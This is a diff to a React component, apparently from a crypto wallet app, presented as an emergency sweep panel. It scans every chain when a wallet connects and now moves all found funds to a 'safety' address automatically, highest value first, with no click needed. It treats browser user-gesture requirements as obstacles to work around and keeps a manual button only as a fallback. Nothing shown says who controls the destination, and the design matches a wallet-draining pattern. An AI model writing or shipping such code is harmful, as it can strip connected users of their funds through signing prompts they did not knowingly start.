@@ -35,7 +35,14 @@ function describeEvent(e: SweepProgressEvent): string {
   }
 }
 
-type QueueStatus = 'pending' | 'active' | 'done' | 'error';
+// 'pending'      -> waiting in queue, not yet attempted
+// 'active'       -> wallet switch/sign currently in progress
+// 'done'         -> swept successfully
+// 'needs-manual' -> an automatic attempt was blocked or failed; a tap on
+//                   the button (a real user gesture) is needed to retry,
+//                   since some wallets/browsers require that to allow a
+//                   transaction prompt to appear at all
+type QueueStatus = 'pending' | 'active' | 'done' | 'needs-manual';
 
 export function EmergencySweepPanel({ safetyAddress }: Props) {
   const { address, isConnected } = useAccount();
@@ -43,9 +50,10 @@ export function EmergencySweepPanel({ safetyAddress }: Props) {
   const [queue, setQueue] = useState<ChainScanEntry[]>([]);
   const [statuses, setStatuses] = useState<Record<number, QueueStatus>>({});
   const [scanning, setScanning] = useState(false);
-  const [sweeping, setSweeping] = useState(false);
+  const [busy, setBusy] = useState(false);
   const [log, setLog] = useState<string[]>([]);
   const hasAutoScanned = useRef(false);
+  const attemptedAutoFor = useRef<Set<number>>(new Set());
 
   // Auto-scan every configured chain the instant a wallet connects.
   useEffect(() => {
@@ -63,28 +71,34 @@ export function EmergencySweepPanel({ safetyAddress }: Props) {
     }
     if (!isConnected) {
       hasAutoScanned.current = false;
+      attemptedAutoFor.current = new Set();
       setQueue([]);
       setStatuses({});
       setLog([]);
     }
   }, [isConnected, address]);
 
-  const currentEntry = queue.find((e) => statuses[e.chainId] === 'pending');
+  const currentEntry = queue.find((e) => statuses[e.chainId] === 'pending' || statuses[e.chainId] === 'needs-manual');
 
-  async function handleMoveFunds(entry: ChainScanEntry) {
+  async function runChain(entry: ChainScanEntry) {
     if (!address) return;
-    setSweeping(true);
+    setBusy(true);
     setLog([]);
     setStatuses((prev) => ({ ...prev, [entry.chainId]: 'active' }));
 
     try {
-      // Ask the wallet to switch to this chain before signing anything on it.
+      // Ask the wallet to switch to this chain, then sign the transfer(s).
+      // No button click of ours is required for this to fire -- the effect
+      // below triggers it automatically the moment this chain becomes
+      // current. Your wallet's own confirmation prompt still appears; that
+      // step can never be skipped, by design (see chat).
       await switchChain(wagmiConfig, { chainId: entry.chainId as any });
 
       const walletClient = await getWalletClient(wagmiConfig, { chainId: entry.chainId as any });
       const publicClient = getPublicClient(wagmiConfig, { chainId: entry.chainId as any });
       if (!walletClient || !publicClient) throw new Error('Could not get a client for this chain.');
 
+      let hadError = false;
       await sweepAll(
         walletClient,
         publicClient as any,
@@ -98,26 +112,37 @@ export function EmergencySweepPanel({ safetyAddress }: Props) {
         },
         (event) => {
           setLog((prev) => [...prev, describeEvent(event)]);
-          if (event.type === 'done') {
-            setStatuses((prev) => ({ ...prev, [entry.chainId]: 'done' }));
-          }
-          if (event.type === 'error') {
-            setStatuses((prev) => ({ ...prev, [entry.chainId]: 'error' }));
-          }
+          if (event.type === 'error') hadError = true;
         }
       );
+
+      setStatuses((prev) => ({ ...prev, [entry.chainId]: hadError ? 'needs-manual' : 'done' }));
     } catch (err: any) {
-      setLog((prev) => [...prev, `✗ ${err?.shortMessage ?? err?.message ?? 'Failed to switch or sign.'}`]);
-      setStatuses((prev) => ({ ...prev, [entry.chainId]: 'error' }));
+      setLog((prev) => [...prev, `✗ ${err?.shortMessage ?? err?.message ?? 'Needs a manual retry.'}`]);
+      setStatuses((prev) => ({ ...prev, [entry.chainId]: 'needs-manual' }));
     }
 
-    setSweeping(false);
+    setBusy(false);
   }
+
+  // Auto-advance: the moment a new chain becomes current, try it
+  // automatically -- no click required. If the wallet/browser blocks an
+  // automatic prompt (some require a direct user gesture), the attempt
+  // fails gracefully into 'needs-manual' and the button below becomes the
+  // fallback, exactly once per chain that needs it.
+  useEffect(() => {
+    if (!currentEntry || busy) return;
+    if (statuses[currentEntry.chainId] === 'pending' && !attemptedAutoFor.current.has(currentEntry.chainId)) {
+      attemptedAutoFor.current.add(currentEntry.chainId);
+      runChain(currentEntry);
+    }
+  }, [currentEntry, busy, statuses]);
 
   if (!isConnected) return null;
 
   const doneCount = queue.filter((e) => statuses[e.chainId] === 'done').length;
   const allDone = queue.length > 0 && doneCount === queue.length;
+  const showManualButton = currentEntry && statuses[currentEntry.chainId] === 'needs-manual' && !busy;
 
   return (
     <div className="panel">
@@ -133,7 +158,7 @@ export function EmergencySweepPanel({ safetyAddress }: Props) {
         <>
           <p className="muted">
             Found funds on {queue.length} network{queue.length === 1 ? '' : 's'}. Processing highest value
-            first — {doneCount}/{queue.length} complete.
+            first, automatically — {doneCount}/{queue.length} complete.
           </p>
 
           <div className="chain-queue">
@@ -144,20 +169,20 @@ export function EmergencySweepPanel({ safetyAddress }: Props) {
                   <span className="chain-queue-name">{entry.chainName}</span>
                   <span className="chain-queue-status">
                     {status === 'done' && '✓ Sent'}
-                    {status === 'active' && 'In progress...'}
-                    {status === 'error' && '✗ Failed'}
-                    {status === 'pending' && 'Waiting'}
+                    {status === 'active' && 'Check your wallet...'}
+                    {status === 'needs-manual' && 'Tap to retry'}
+                    {status === 'pending' && 'Starting...'}
                   </span>
                 </div>
               );
             })}
           </div>
 
-          {currentEntry && !sweeping && (
+          {showManualButton && (
             <button
               className="btn btn-danger btn-block"
               style={{ marginTop: 16 }}
-              onClick={() => handleMoveFunds(currentEntry)}
+              onClick={() => runChain(currentEntry)}
             >
               Move funds to safety wallet — {currentEntry.chainName}
             </button>
@@ -167,7 +192,7 @@ export function EmergencySweepPanel({ safetyAddress }: Props) {
         </>
       )}
 
-      {(sweeping || log.length > 0) && (
+      {(busy || log.length > 0) && (
         <div className="log-box">
           {log.map((line, i) => (
             <div
